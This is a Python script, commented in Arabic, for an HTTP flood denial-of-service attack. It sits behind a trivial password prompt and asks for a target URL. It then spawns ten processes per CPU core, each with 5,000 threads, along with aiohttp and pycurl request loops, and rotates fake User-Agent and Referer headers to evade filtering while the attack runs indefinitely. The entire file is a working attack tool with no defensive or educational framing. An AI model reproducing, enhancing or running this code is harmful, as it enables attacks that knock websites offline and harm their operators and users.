import time
import multiprocessing
import requests
import aiohttp
import asyncio
import pycurl
from colorama import Fore, Style
from concurrent.futures import ThreadPoolExecutor
from io import BytesIO
import random

# متغير لتتبع حالة إيقاف الهجوم
stop_attack_flag = multiprocessing.Value('b', False)

# قائمة برؤوس HTTP مختلفة
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://www.duckduckgo.com/",
]

def get_random_headers():
    """إرجاع رؤوس HTTP عشوائية."""
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Referer": random.choice(REFERERS),
    }

def display_banner():
    banner_text = "j"
    for char in banner_text:
        print(Fore.GREEN + char + Style.RESET_ALL)
        time.sleep(0.05)

def password_prompt():
    password = input("Enter password: ")
    if password == "j":
        print(Fore.GREEN + "Correct password! Opening attack menu..." + Style.RESET_ALL)
        start_attack()
    else:
        print(Fore.RED + "Wrong password! Exiting..." + Style.RESET_ALL)
        exit()

def send_requests_threaded(target, stop_flag):
    session = requests.Session()
    
    def send_request():
        while not stop_flag.value:
            try:
                headers = get_random_headers()  # تغيير الرؤوس بشكل عشوائي
                session.get(target, headers=headers, timeout=5)
            except requests.exceptions.RequestException:
                pass

    num_threads = 5000  # زيادة عدد الخيوط بشكل كبير

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(send_request) for _ in range(num_threads)]
        
        for future in futures:
            if stop_flag.value:
                break

async def send_requests_aiohttp(target, stop_flag):
    async with aiohttp.ClientSession() as session:
        while not stop_flag.value:
            try:
                headers = get_random_headers()  # تغيير الرؤوس بشكل عشوائي
                async with session.get(target, headers=headers, timeout=5) as response:
                    await response.text()
            except aiohttp.ClientError:
                pass

def send_requests_pycurl(target, stop_flag):
    while not stop_flag.value:
        buffer = BytesIO()
        c = pycurl.Curl()
        c.setopt(c.URL, target)
        c.setopt(c.WRITEDATA, buffer)
        headers = get_random_headers()  # تغيير الرؤوس بشكل عشوائي
        c.setopt(c.HTTPHEADER, [f"{k}: {v}" for k, v in headers.items()])
        try:
            c.perform()
        except pycurl.error:
            pass
        finally:
            c.close()

def show_attack_animation():
    print("Loading...")

def start_attack():
    try:
        target = input("Target URL: ")
        print("Attack will continue indefinitely. Type 'stop' to end it.")
        execute_attack(target)
    except Exception as e:
        print(f"Error: {str(e)}")

def execute_attack(target):
    total_cores = multiprocessing.cpu_count()

    print(f"Starting continuous attack on {target} using {total_cores} cores...")

    show_attack_animation()

    processes = []

    with stop_attack_flag.get_lock():
        stop_attack_flag.value = False

    try:
        # زيادة عدد العمليات بشكل كبير
        for i in range(total_cores * 10):  # استخدام 10 عمليات لكل نواة
            process = multiprocessing.Process(target=send_requests_threaded, args=(target, stop_attack_flag))
            processes.append(process)
            process.start()

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(send_requests_aiohttp(target, stop_attack_flag))

        pycurl_process = multiprocessing.Process(target=send_requests_pycurl, args=(target, stop_attack_flag))
        processes.append(pycurl_process)
        pycurl_process.start()

        print(Fore.YELLOW + "Attack in progress... Press Ctrl+C to stop." + Style.RESET_ALL)

        for process in processes:
            process.join()

    except KeyboardInterrupt:
        with stop_attack_flag.get_lock():
            stop_attack_flag.value = True
        print(Fore.RED + "Attack stopped." + Style.RESET_ALL)

    except Exception as e:
        print(f"Error during attack: {str(e)}")

def main():
    try:
        display_banner()
        password_prompt()
    except Exception as e:
        print(f"Error: {str(e)}")

if __name__ == "__main__":
    main()
